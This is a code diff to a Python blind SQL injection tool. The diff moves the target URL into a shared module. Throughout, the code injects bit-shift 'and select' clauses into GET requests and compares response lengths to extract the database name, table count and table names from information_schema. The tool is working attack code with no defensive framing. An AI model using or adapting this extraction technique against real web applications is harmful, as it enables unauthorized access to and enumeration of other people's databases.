@@ -4,11 +4,8 @@ import bitwise_public
 
 
 class GetDbTableInformationClass:
-    # Insert target url
-    TARGET_URL = ''
-
     def __init__(self):
-        self.SUCCESS_LENGTH = len(requests.get(self.TARGET_URL).text)
+        self.SUCCESS_LENGTH = len(requests.get(bitwise_public.TARGET_URL).text)
         # Using DB name length
         self.db_name_length = 0
         # Using DB name
@@ -24,7 +21,7 @@ class GetDbTableInformationClass:
     def get_db_name_length(self):
         length_bin_list = []
         for shift_idx in range(7, -1, -1):
-            res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                       bitwise_public.DATA_LENGTH_SHIFT_QUERY.format('db_name()',
                                                                                                     shift_idx))).text)
             length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
@@ -38,7 +35,7 @@ class GetDbTableInformationClass:
         for db_name_idx in range(self.db_name_length):
             db_name_char_bin_list = []
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                           bitwise_public.DATA_BIT_SHIFT_QUERY.format('db_name()',
                                                                                                      db_name_idx + 1,
                                                                                                      shift_idx,
@@ -54,7 +51,7 @@ class GetDbTableInformationClass:
         number_bin_list = []
         for shift_idx in range(7, -1, -1):
             # Need know DB name
-            res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                       bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
                                                           """select count(*) from information_schema.tables 
                                                           where table_schema = '{0}'""".format(self.db_name)
@@ -68,7 +65,7 @@ class GetDbTableInformationClass:
         for table_idx in range(self.tables_number):
             tables_length_bin_list = []
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                           bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select TABLE_NAME
                                                           from information_schema.tables where table_schema = '{0}'
                                                           limit {1},1""".format(self.db_name, table_idx),
@@ -86,7 +83,7 @@ class GetDbTableInformationClass:
             for table_name_idx in range(self.tables_name_length[table_idx]):
                 table_name_char_bin_list = []
                 for shift_idx in range(7, -1, -1):
-                    res_length = len(requests.get(requote_uri(self.TARGET_URL + '\' and select ' +
+                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
                                                               bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
                                                               TABLE_NAME from information_schema.tables 
                                                               where table_schema = '{0}'
